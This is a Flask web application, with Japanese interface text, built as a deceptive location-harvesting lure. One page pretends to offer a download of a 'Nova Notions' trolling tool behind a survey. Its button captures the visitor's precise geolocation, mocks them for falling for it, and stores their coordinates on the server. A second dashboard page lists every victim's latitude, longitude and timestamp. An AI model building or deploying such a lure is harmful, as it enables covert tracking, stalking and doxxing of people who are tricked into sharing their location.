from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# データ保存用
DATA_FILE = 'locations.json'

def save_location(lat, lng):
    """位置情報を保存"""
    locations = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            locations = json.load(f)
    
    locations.append({
        'latitude': lat,
        'longitude': lng,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    with open(DATA_FILE, 'w') as f:
        json.dump(locations, f, indent=2)
    
    return len(locations)

def load_locations():
    """位置情報を読み込み"""
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return []

# ===== メインページ =====
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>位置情報システム</title>
        <style>
            body { font-family: Arial; padding: 20px; text-align: center; }
            .container { max-width: 800px; margin: 0 auto; }
            .button {
                display: block;
                width: 300px;
                margin: 20px auto;
                padding: 20px;
                font-size: 20px;
                text-decoration: none;
                color: white;
                border-radius: 10px;
            }
            .client1 { background: #4CAF50; }
            .client2 { background: #2196F3; }
            .button:hover { opacity: 0.9; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>位置情報システム</h1>
            <p>選択してください：</p>
            <a href="/client1" class="button client1">📱 クライアント1 - 位置情報取得</a>
            <a href="/client2" class="button client2">📊 クライアント2 - ダッシュボード</a>
            <p style="margin-top: 50px; color: #666;">
                Renderサーバー上で動作中
            </p>
        </div>
    </body>
    </html>
    '''

# ===== クライアント1 =====
@app.route('/client1')
def client1():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>クライアント1 - 位置情報取得</title>
        <style>
            body {
                font-family: Arial;
                padding: 20px;
                max-width: 500px;
                margin: 0 auto;
                text-align: center;
            }
            button {
                background: #4CAF50;
                color: white;
                border: none;
                padding: 15px 30px;
                font-size: 18px;
                border-radius: 5px;
                cursor: pointer;
                margin: 20px 0;
            }
            button:disabled {
                background: #ccc;
                cursor: not-allowed;
            }
            #status {
                margin: 20px 0;
                padding: 10px;
                border-radius: 5px;
                min-height: 50px;
            }
            .success { background: #d4edda; color: #155724; }
            .error { background: #f8d7da; color: #721c24; }
            .info { background: #d1ecf1; color: #0c5460; }
            .back-link {
                display: block;
                margin-top: 30px;
                color: #666;
            }
        </style>
    </head>
    <body>
        <h1>Nova Notions荒らしツール</h1>
        <p>ダウンロード前にアンケートにご協力ください。</p>
        
        <button onclick="getLocation()" id="locationBtn">
             アンケートフォームへ飛ぶ
        </button>
        
        <div id="status"></div>
        
        <a href="/" class="back-link">← トップページに戻る</a>
        
        <script>
        const btn = document.getElementById('locationBtn');
        const statusDiv = document.getElementById('status');
        
        function showMessage(text, type) {
            statusDiv.innerHTML = text;
            statusDiv.className = type;
        }
        
        function getLocation() {
            btn.disabled = true;
            btn.textContent = '取得中...';
            
            showMessage('少々お待ち下さい...', 'info');
            
            // 位置情報取得
            if (!navigator.geolocation) {
                showMessage('このブラウザは対応していません', 'error');
                btn.disabled = false;
                btn.textContent = 'アンケートフォームへ飛ぶ';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    showMessage(
                        `位置情報を取得しました！　残念、また次回！<br>
                        緯度: ${lat}<br>
                        経度: ${lng}<br>
                        <br>次回は賢くなろうね、、サーバーに送信中...`,
                        'info'
                    );
                    
                    try {
                        // サーバーに送信
                        const response = await fetch('/save-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lng
                            })
                        });
                        
                        const data = await response.json();
                        
                        if (data.success) {
                            showMessage(
                                `✅ 位置情報を保存しました！<br>
                                保存件数: ${data.count}件<br>
                                <br>3秒後にダウンロードを開始します...`,
                                'success'
                            );
                            
                            // ダウンロード開始
                            setTimeout(() => {
                                window.location.href = 'https://example.com/sample.pdf';
                            }, 3000);
                        }
                    } catch (error) {
                        showMessage('サーバーエラー: ' + error.message, 'error');
                        btn.disabled = false;
                        btn.textContent = 'アンケートフォームへ飛ぶ';
                    }
                },
                function(error) {
                    let message = '位置情報の取得に失敗しました: ';
                    switch(error.code) {
                        case 1:
                            message += 'ユーザーが許可を拒否しました';
                            break;
                        case 2:
                            message += '位置情報が利用できません';
                            break;
                        case 3:
                            message += 'タイムアウトしました';
                            break;
                        default:
                            message += '不明なエラー';
                    }
                    showMessage(message, 'error');
                    btn.disabled = false;
                    btn.textContent = 'アンケートフォームへ飛ぶ';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        </script>
    </body>
    </html>
    '''

# ===== クライアント2 =====
@app.route('/client2')
def client2():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>クライアント2 - ダッシュボード</title>
        <style>
            body {
                font-family: Arial;
                padding: 20px;
                max-width: 800px;
                margin: 0 auto;
            }
            h1 { color: #333; }
            .controls {
                margin: 20px 0;
            }
            button {
                background: #2196F3;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                margin-right: 10px;
            }
            button:hover { background: #0b7dda; }
            #map {
                height: 400px;
                background: #f0f0f0;
                border-radius: 10px;
                margin: 20px 0;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #666;
                border: 2px dashed #ccc;
            }
            .location-item {
                background: white;
                border: 1px solid #ddd;
                border-radius: 5px;
                padding: 15px;
                margin: 10px 0;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            .location-time {
                font-weight: bold;
                color: #2196F3;
                margin-bottom: 5px;
            }
            .location-coords {
                font-family: monospace;
                background: #f5f5f5;
                padding: 5px 10px;
                border-radius: 3px;
                display: inline-block;
                margin: 5px 0;
            }
            .no-data {
                text-align: center;
                color: #666;
                padding: 40px;
                font-size: 18px;
            }
            .back-link {
                display: block;
                margin-top: 30px;
                color: #666;
            }
        </style>
    </head>
    <body>
        <h1>位置情報ダッシュボード</h1>
        
        <div class="controls">
            <button onclick="loadData()">🔄 データを読み込む</button>
            <span id="count" style="margin-left: 20px; font-weight: bold;"></span>
        </div>
        
        <div id="map">
            🗺️ 地図表示エリア<br>
            <small>（シンプル版のため地図は表示しません）</small>
        </div>
        
        <div id="locations"></div>
        
        <a href="/" class="back-link">← トップページに戻る</a>
        
        <script>
        function loadData() {
            const locationsDiv = document.getElementById('locations');
            const countSpan = document.getElementById('count');
            
            locationsDiv.innerHTML = '<p>データを読み込み中...</p>';
            
            fetch('/get-locations')
                .then(response => response.json())
                .then(data => {
                    // 件数を表示
                    countSpan.textContent = `全 ${data.length} 件`;
                    
                    if (data.length === 0) {
                        locationsDiv.innerHTML = '<div class="no-data">データがありません</div>';
                        return;
                    }
                    
                    // データを表示（新しい順）
                    let html = '';
                    data.slice().reverse().forEach(loc => {
                        html += `
                            <div class="location-item">
                                <div class="location-time">${loc.time}</div>
                                <div class="location-coords">
                                    緯度: ${loc.latitude}, 経度: ${loc.longitude}
                                </div>
                            </div>
                        `;
                    });
                    
                    locationsDiv.innerHTML = html;
                })
                .catch(error => {
                    locationsDiv.innerHTML = '<p style="color: red;">データの読み込みに失敗しました</p>';
                    console.error(error);
                });
        }
        
        // ページ読み込み時に自動でデータを読み込む
        loadData();
        </script>
    </body>
    </html>
    '''

# ===== APIエンドポイント =====
@app.route('/save-location', methods=['POST'])
def save_location_api():
    data = request.json
    count = save_location(data['latitude'], data['longitude'])
    return jsonify({'success': True, 'count': count})

@app.route('/get-locations')
def get_locations_api():
    return jsonify(load_locations())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
